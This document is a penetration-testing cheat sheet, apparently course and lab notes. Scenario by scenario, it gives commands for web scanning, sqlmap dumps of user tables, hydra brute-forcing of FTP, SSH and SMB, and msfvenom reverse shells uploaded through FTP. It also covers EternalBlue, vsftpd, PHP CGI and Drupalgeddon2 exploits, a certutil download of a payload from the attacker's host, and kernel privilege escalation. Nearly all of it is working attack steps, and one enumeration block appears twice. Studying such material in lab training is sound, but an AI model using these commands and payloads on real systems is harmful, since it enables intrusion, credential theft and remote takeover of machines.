gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r

gobuster dir -u http://<TARGET_IP>/data -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r

# Nikto
nikto -h http://<TARGET_IP> -o niktoscan.txt

nikto -h http://<TARGET_IP>/index.php?page=arbitrary-file-inclusion.php -Tuning 5 -o nikto.html -Format htm

# SQLMap
sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title

sqlmap -r <REQUEST_FILE> -p <POST_PARAMETER>

## List databases
sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title --dbs

sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP --tables

sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP -T users --columns

sqlmap -u "http://<TARGET_IP>/sqli_1.php?title=hacking&action=search" --cookie "PHPSESSID=rmoepg39ac0savq89d1k5fu2q1; security_level=0" -p title -D bWAPP -T users -C admin,password,email --dump

# XSSer
xsser --url 'http://<TARGET_IP>/index.php?page=dns-lookup.php' -p
'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'

xsser --url 'http://<TARGET_IP>/index.php?page=dns-lookup.php' -p
'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto

xsser --url 'http://<TARGET_IP>/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>"

xsser --url "http://<TARGET_IP>/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=2&user-poll-php-submit-button=Submit+Vote" --Fp "<script>alert(1)</script>"

## Authenticated XSSer
xsser --url "http://<TARGET_IP>/htmli_get.php?firstname=XSS&lastname=hi&form=submit" --cookie="PHPSESSID=lb3rg4q495t9sqph907sdhjgg1; security_level=0" --Fp "<script>alert(1)</script>"


# Hydra - Basic auth attacks (brute-force)
hydra -L <USERS_LIST> -P <PW_LIST> <TARGET_IP> http-post-form "/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid credentials or user not activated!"
----------------------------------------------------------------------------------------------------------------------------------------------
                                                        INE Course Ends                                                                       |
----------------------------------------------------------------------------------------------------------------------------------------------
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\
----------------------------------------------------------------------------------------------------------------------------------------------
Part X : TroubleMakers                                                                                                                        |
----------------------------------------------------------------------------------------------------------------------------------------------
Scenario 1: Targeting IIS & FTP
nmap -sV -sC -p21,80 <TARGET_IP>
## Try anonymous:anonymous
ftp <TARGET_IP>

## Brute-force FTP
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt <TARGET_IP> ftp

hydra -l administrator -P /usr/share/wordlists/metasploit/unix_users.txt <TARGET_IP> ftp -I
hydra -l <USER> -P /usr/share/wordlists/metasploit/unix_users.txt <TARGET_IP> ftp -I

## Generate an .asp reverse shell payload
cd <TARGET>/
ip -br -c a
msfvenom -p windows/shell/reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f asp > shell.aspx

## FTP Login with <USER>
ftp <TARGET_IP>
put shell.aspx

## msfconsole
use multi/handler
set payload windows/shell/reverse_tcp
set LHOST <LOCAL_IP>
set LPORT <LOCAL_PORT>

## Open http://<TARGET_IP>/shell.aspx . A reverse shell may be received.
----------------------------------------------------------------------------------------------------------------------------------------------
Scenario 2: Targeting OPENSSH

nmap -sV -sC -p 22 <TARGET_IP>

searchsploit OpenSSH 7.1

## Brute-force SSH
hydra -l administrator /usr/share/wordlists/metasploit/unix_users.txt <TARGET_IP> ssh
hydra -l <USER> -P /usr/share/wordlists/metasploit/unix_users.txt <TARGET_IP> ssh

## SSH Login with <USER>
ssh <USER>@<TARGET_IP>

## Win
bash
net localgroup administrators
whoami /priv

# msfconsole
use auxiliary/scanner/ssh/ssh_login
setg RHOST <TARGET_IP>
setg RHOSTS <TARGET_IP>
set USERNAME <USER>
set PASSWORD <PW>
run
session 1
# CTRL+Z to background
sessions -u 1
----------------------------------------------------------------------------------------------------------------------------------------------
Scenario 3: Targeting SMB

nmap -sV -sC -p 445 <TARGET_IP>

## Brute-force SMB
hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt <TARGET_IP> smb
hydra -l <USER> -P /usr/share/wordlists/metasploit/unix_passwords.txt <TARGET_IP> smb

## Enumeration
smbclient -L <TARGET_IP> -U <USER>
smbmap -u <USER> -p <PW> -H <TARGET_IP>
enum4linux -u <USER> -p <PW> -U <TARGET_IP>

## msfconsole
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS <TARGET_IP>
set SMBUser <USER>
set SMBPass <PW>
run

## SMB Login with <USER>
locate psexec.py
cp /usr/share/doc/python3-impacket/examples/psexec.py .
chmod +x psexec.py
python3 psexec.py Administrator@<TARGET_IP>
python3 psexec.py <USER>@<TARGET_IP>

# msfconsole - Meterpreter
use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set SMBUser Administrator
set SMBPass <PW>
set payload windows/x64/meterpreter/reverse_tcp
run

# Without <USER>:<PW>, exploit a vulnerability, e.g. EternalBlue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
run
----------------------------------------------------------------------------------------------------------------------------------------------
Scenario 4: Targeting MYSQL (Wordpress)
nmap -sV -sC -p 3306,8585 <TARGET_IP>

searchsploit MySQL 5.5

## Brute-force MySql - msfconsole
msfconsole -q
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <TARGET_IP>
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
run

## MYSQL Login with <USER>
mysql -u root -p -h <TARGET_IP>

show databases;
use <db>;
show tables;
select * from <table>;

## msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
run

sysinfo
cd /
cd wamp
dir
cd www\\wordpress
cat wp-config.php
shell
----------------------------------------------------------------------------------------------------------------------------------------------
Scenario 5: Targeting VSFTPD
nmap -sV -sC -p 21 <TARGET_IP>

## Try anonymous:anonymous
ftp <TARGET_IP>

## Exploit vsFTPd
searchsploit vsftpd
searchsploit -m 49757
vim 49757.py
chmod +x 49757.py
python3 49757.py <TARGET_IP>

## Enumerate SMTP - msfconsole
use auxiliary/scanner/smtp/smtp_enum
setg RHOSTS <TARGET_IP>
set UNIXONLY true
run

## Brute-force FTP
hydra -l <USER> -P /usr/share/metasploit-framework/data/wordlists/unix_users.txt <TARGET_IP> ftp

## Modify the shell via FTP
cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php shell.php
vim shell.php
## Change the $ip & $port variable to the Attacker's IP & port

ftp <TARGET_IP>
cd /
cd /var/www/dav
put shell.php

## Attacker listener
nc -nvlp <PORT>
## Open http://<TARGET_IP>/dav/shell.php

/bin/bash -i
----------------------------------------------------------------------------------------------------------------------------------------------
Scenario 6: Linux Exploitation

Attacker's machine - Find target IP
cat /etc/hosts
ping <TARGET_IP>
ping <TARGET_FQDN>
mkdir <TARGET>
cd <TARGET>/

# Port Scanning - 1000 common ports or more advanced scans
nmap -sV <TARGET_IP>
nmap -sV -p 1-10000 <TARGET_IP> -oX nmap_10k
nmap -T4 -PA -sC -sV -p 1-10000 <TARGET_IP> -oX nmap_10k
nmap -T4 -PA -sC -sV -p- <TARGET_IP> -oX nmap_all
nmap -sU -sV <TARGET_IP> -oX nmap_udp

# Banner Grabbing - various ports e.g.
nc -nv <TARGET_IP> 512
nc -nv <TARGET_IP> 513
nc -nv <TARGET_IP> 1524

# Enumeration
cat /etc/*release
whoami
----------------------------------------------------------------------------------------------------------------------------------------------
Scenario 7: Targeting PHP

nmap -sV -sC -p 80 <TARGET_IP>

## Browse
http://<TARGET_IP>/phpinfo.php

## Manual Exploitation PHP CGI
searchsploit php cgi
searchsploit -m 18836
python2 18836.py <TARGET_IP> 80
## If it executes, modify the .py script
vim 18836.php
## PHP Reverse Shell
pwn_code = """<?php $sock=fsockopen("<ATTACKER_IP>",<PORT>);exec("/bin/sh -i <&4 >&4 2>&4");?>"""

## Attacker listener in another tab
nc -nvlp <PORT>
## Launch the exploit
python2 18836.py <TARGET_IP> 8



Scenario 8: Targeting SAMBA
nmap -sV -p 445 <TARGET_IP>

nc -nv <TARGET_IP> 445

searchsploit samba 3.0.20

# msfconsole
use auxiliary/scanner/smb/smb_version
setg RHOSTS <TARGET_IP>
run

use exploit/multi/samba/usermap_script
run
background
sessions -u 1
sessions 2

cat /etc/shadow
----------------------------------------------------------------------------------------------------------------------------------------------
Scenario 9: Windows Local Enumeration
# MSF Meterpreter
getuid
sysinfo
show_mount
cat C:\\Windows\\System32\\eula.txt
getprivs
pgrep explorer.exe
migrate <PROCESS_ID>

# Win CMD - run 'shell' in Meterpreter
## System
hostname
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn

## Users
whoami
whoami /priv
query user
net users
net user <USER>
net localgroup
net localgroup Administrators
net localgroup "Remote Desktop Users"

## Network
ipconfig
ipconfig /all
route print
arp -a
netstat -ano
netsh firewall show state
netsh advfirewall show allprofiles

## Services
ps
net start
wmic service list brief
tasklist /SVC
schtasks /query /fo LIST
schtasks /query /fo LIST /v

# Metasploit
use post/windows/gather/enum_logged_on_users
use post/windows/gather/win_privs
use post/windows/gather/enum_logged_on_users
use post/windows/gather/checkvm
use post/windows/gather/enum_applications
use post/windows/gather/enum_computers
use post/windows/gather/enum_patches
use post/windows/gather/enum_shares

# JAWS - Automatic Local Enumeration - Powershell
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename Jaws-Enum.txt
----------------------------------------------------------------------------------------------------------------------------------------------
Scenario 10: # MSF Meterpreter
getuid
sysinfo
show_mount
cat C:\\Windows\\System32\\eula.txt
getprivs
pgrep explorer.exe
migrate <PROCESS_ID>

# Win CMD - run 'shell' in Meterpreter
## System
hostname
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn

## Users
whoami
whoami /priv
query user
net users
net user <USER>
net localgroup
net localgroup Administrators
net localgroup "Remote Desktop Users"

## Network
ipconfig
ipconfig /all
route print
arp -a
netstat -ano
netsh firewall show state
netsh advfirewall show allprofiles

## Services
ps
net start
wmic service list brief
tasklist /SVC
schtasks /query /fo LIST
schtasks /query /fo LIST /v

# Metasploit
use post/windows/gather/enum_logged_on_users
use post/windows/gather/win_privs
use post/windows/gather/enum_logged_on_users
use post/windows/gather/checkvm
use post/windows/gather/enum_applications
use post/windows/gather/enum_computers
use post/windows/gather/enum_patches
use post/windows/gather/enum_shares

# JAWS - Automatic Local Enumeration - Powershell
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename Jaws-Enum.txt
----------------------------------------------------------------------------------------------------------------------------------------------
Drupal Geddon 2 CMS Website Exploitation
----------------------------------------------------------------------------------------------------------------------------------------------
### Recon Phase

1. Information Gathering:
`nmap -Pn -sV -F <ip_address>`

2. Version Discovery:
burpsuite : Repeater --> Response --> X-Generator
3. Directory Enumeration:
`gobuster dir --url http://<ip_address> --wordlist /usr/share/seclists/Discovery/Web-content/CMS/Drupal.txt`

-> Changelog.txt to get the specific version

4. Changelog file:
        -> Drupal 7.54, 2017-02-01 ( Newest to oldest )
5.  Exploit Identification:
`git clone https://github.com/dreadlocked/Drupalgeddon2`
`./drupalgeddon2.rb http://<ip_address>
drupalgeddon2>> whoami

drupalgeddon2>> systeminfo

drupalgeddon2>> cd C:\\

6. Reverse Shell : 
kali@kali > msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= <attacker> LPORT= <PORT> -f exe > rev.exe
kali@kali > sudo python3 -m http.server 80
7. drupalgeddon2>> certutil -urlcache -f http://<attacker>/rev.exe rev.exe
8. 
kali@kali > msfconsole
kali@kali > use multi/handler
9. Execute rev.exe
drupalgeddon2>> .\rev.exe
10. Privilege Escalation 
meterpreter> sysinfo
meterpreter> getuid
meterpreter> getprivs
-> impersonatePrivilege
meterpreter> load incongnito
meterpreter> list_tokens -u
meterpreter> getsystem
--> fail -> it is a kernel exploit !! 
meterpreter> ps
-> no interesting exe to migrate to!!
`https://github.com/SecWiki/windows-kernel-exploits`
`MS14-058`

11.
kali@kali > msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= <attacker> LPORT= <PORT> -f exe > esc.exe
meterpreter> mkdir Temp
meterpreter> cd Temp\\
meterpreter> upload ~/Downloads/MS14-058.exe
meterpreter> upload esc.exe
// set up a handler
meterpreter> shell
C:\Temp > .\MS14-058.exe esc.exe
--> if it hangs background the session and then ( ex: session 3 ), you need to use the metasploit module for it.
use exploit/windows/local/ms14_058_track_popup_menu
set SESSION 3



